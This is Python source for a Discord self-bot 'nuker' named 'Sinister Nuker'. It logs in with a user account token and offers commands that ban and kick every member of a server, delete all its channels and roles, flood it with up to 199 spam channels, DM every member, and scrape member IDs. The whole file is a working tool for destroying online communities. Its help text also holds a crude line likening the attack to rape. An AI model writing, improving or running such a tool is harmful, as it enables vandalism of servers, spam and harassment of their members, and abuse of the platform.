import os
import requests
import random
import sys
import threading
import time
import psutil
import inspect
from colorama import Fore, Back, Style

import json
import asyncio
import discord
import aiohttp


from ctypes import *
from discord.ext import commands


channels = ["reside kissed you", "we love you side", "reside was here"]

token = input(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Token : ')

os.system('clear')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
      print(f'{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Invalid Token')
      os._exit(0)

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

with open("config.json") as f:
    config = json.load(f)

prefix = config.get("prefix")

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)

sinister = client

@sinister.event
async def on_connect():
	print(f"""


                                            {Fore.RED}╔═╗ ╦ ╔╗╔ ╦ ╔═╗ ╔╦╗ ╔═╗ ╦═╗
                                            {Fore.BLACK}{Style.BRIGHT}╚═╗ ║ ║║║ ║ ╚═╗  ║  ║╣  ╠╦╝
                                            {Fore.WHITE}╚═╝ ╩ ╝╚╝ ╩ ╚═╝  ╩  ╚═╝ ╩╚═
                          
                     
      
                                ════════════════════════════════════════════════════
                          
                          
                                Prefix{Fore.RED}[{Fore.RESET}{prefix}{Fore.RED}]{Fore.RESET} 

                                Servers{Fore.RED}[{Fore.RESET}{len(sinister.guilds)}{Fore.RED}]{Fore.RESET}

                                Friends{Fore.RED}[{Fore.RESET}{len(sinister.user.friends)}{Fore.RED}]{Fore.RESET}   
                                
                                Connected{Fore.RED}[{Fore.RESET}{sinister.user.name}{Fore.RED}]{Fore.RESET}
                    
                                Creator{Fore.RED}[{Fore.RESET}reside#1337{Fore.RED}]{Fore.RESET}
                   

                                ════════════════════════════════════════════════════ 

    """ + Fore.RESET)
	await client.change_presence(status=discord.Status.idle, activity=discord.Game('Sinister Nuker'))

client.remove_command("help")

@sinister.command()
async def help(ctx):
	await ctx.message.delete()
	embed = discord.Embed(description=
	    "```\n• wizz    | wizzes and rapes the server\n• dmall   | dms all members in the server\n• ball    | bans all users in the server\n• kall    | kicks every element of the server\n• chan    | deletes all channels in the server\n• scrape  | scrapes member ids\n• role    | deletes all roles in the server\n• quit    | logs out of the criminals account```",
	    colour=0x2f3136)
	await ctx.send(embed=embed, delete_after=10)

@sinister.command(pass_context=True)
async def wizz(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Banned {Fore.RED}{user.name}{Fore.RED}")
        except:
            print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Ban {Fore.RED}{user.name}{Fore.RED}")
    for channel in ctx.guild.channels:
        try:
          await channel.delete()
          print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}{Fore.RESET} Succesfully Deleted {channel.name}')
        except:
          print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Delete {Fore.RED}{channel.name}{Fore.RED}")
    for i in range(1, 200):
      try:
        await ctx.guild.create_text_channel(random.choice(channels))
        print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Succesfully Created Channels')
      except:
        print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Failed To Create Channels')
    

@sinister.command()
async def dmall(ctx, *, message):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(1)
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Sleeping For {Fore.RED}1{Fore.RED}{Fore.RESET} Second")
            await user.send(message)
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Successfully Dmed {Fore.RED}{user.name}{Fore.RED}{Fore.RESET}")
        except:
            print(f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET}{Fore.RED}{Fore.RESET} Failed To{Fore.RESET} Dmall")
            pass

@sinister.command()
async def ball(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
            print (f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Banned {Fore.RED}{user.name}{Fore.RED}")
        except:
            print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Ban {Fore.RED}{user.name}{Fore.RED}")
              
@sinister.command()
async def kall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
            print (f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Kicked {Fore.RED}{user.name}{Fore.RED}")
        except:
            print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Kick {Fore.RED}{user.name}{Fore.RED}")


@sinister.command()
async def chan(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print (f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Successfully Deleted {Fore.RED}{channel.name}{Fore.RED}")
        except:
            print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Delete {Fore.RED}{channel.name}{Fore.RED}")

@sinister.command()
async def role(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Successfully Deleted {Fore.RED}{role.name}{Fore.RED}")
        except:
            print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Delete {Fore.RED}{role.name}{Fore.RED}")

@sinister.command()
async def scrape(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      with open("scrape.txt", "w") as f:
        f.write(f"{member.id}")
        print (f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Successfully Scraped {Fore.RED}{member.id}{Fore.RED}")
    except:
        print (f"{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Failed To Scrape {Fore.RED}{member.id}{Fore.RED}")
    

        
@sinister.command()
async def quit(ctx):
    await ctx.message.delete()
    print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Logged Out Of {sinister.user.name}")
    embed = discord.Embed(description=f"Logged Out Of {sinister.user.name}", color=0x2f3136)
    await ctx.send(embed=embed, delete_after=7)
    await asyncio.sleep(8)
    await sinister.logout()

sinister.run(token, bot=False)
